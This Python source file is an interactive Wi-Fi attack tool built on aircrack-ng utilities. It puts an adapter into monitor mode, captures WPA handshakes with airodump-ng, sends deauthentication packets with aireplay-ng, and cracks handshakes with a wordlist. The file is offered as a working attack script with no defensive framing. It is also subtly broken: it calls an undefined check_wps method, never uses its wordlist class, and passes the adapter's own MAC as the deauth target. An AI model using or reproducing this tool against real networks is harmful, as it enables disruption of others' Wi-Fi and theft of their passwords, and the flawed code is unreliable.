import subprocess
import getmac


class WordlistAttackTool:
    def __init__(self, handshake_file, wordlist_file):
        self.handshake_file = handshake_file
        self.wordlist_file = wordlist_file

    def run_wordlist_attack(self):
        """Perform wordlist attack using aircrack-ng"""
        print("Performing wordlist attack...")

        # Start wordlist attack using aircrack-ng
        cmd = ["aircrack-ng", self.handshake_file, '-w', self.wordlist_file]
        subprocess.call(cmd)

        print("Wordlist attack completed.")


class WifiScan:
    def __init__(self, adapter):
        self.adapter = adapter

    def enable_monitor_mode(self):
        """Enable monitor mode"""
        print(f"Changing {self.adapter} to monitor mode")
        subprocess.run(["ifconfig", self.adapter, "down"])
        subprocess.run(["iwconfig", self.adapter, "mode", "monitor"])
        subprocess.run(["ifconfig", self.adapter, "up"])

    def deauth_attack(self, client_bssid, deauth_pack, client_mac):
        '''Deauth attack function'''
        print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
        subprocess.run(
            ['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, self.adapter],
            check=True)

    def capture_handshake(self):
        """Capture WPA handshake"""
        print("Capturing handshake")

        # Get the current MAC address
        current_mac = getmac.get_mac_address(interface=self.adapter)
        print("Current MAC address:", current_mac)

        try:
            print("[+] Press Control + C to stop scan")
            airodump_process = subprocess.Popen(['airodump-ng', self.adapter])
            airodump_process.wait()
        except KeyboardInterrupt:
            channel = input("[+] Input channel of Wi-Fi network: ")
            client_bssid = input("[+] Input client BSSID: ")
            handshake_file = input("[+] Input handshake file name: ")

            subprocess.run([
                'airodump-ng',
                '--bssid', client_bssid,
                '--channel', channel,
                '--write', handshake_file,
                self.adapter
            ])

    def run_wifi_scan(self):
        user_selection = self.get_user_selection()

        if user_selection == '1':
            try:
                self.enable_monitor_mode()
                self.check_wps()
            except KeyboardInterrupt:
                pass

        elif user_selection == '2':
            try:
                self.capture_handshake()
            except KeyboardInterrupt:
                print("Interrupted capture. Proceeding with deauth attack...")
                client_bssid = input("[+] Input client BSSID: ")
                deauth_pack = int(input("[+] Input number of deauth packets: "))
                client_mac = getmac.get_mac_address(interface=self.adapter)
                self.deauth_attack(client_bssid, deauth_pack, client_mac)

    @staticmethod
    def get_user_selection():
        print("[+] Which action do you want to perform:")
        print("1. Check for WPS")
        print("2. Capture Handshake")
        return input("Selection: ")


def main():
    adapter = input("[+] Input Wi-Fi adapter: ")
    tool = WifiScan(adapter)
    tool.run_wifi_scan()


if __name__ == "__main__":
    main()
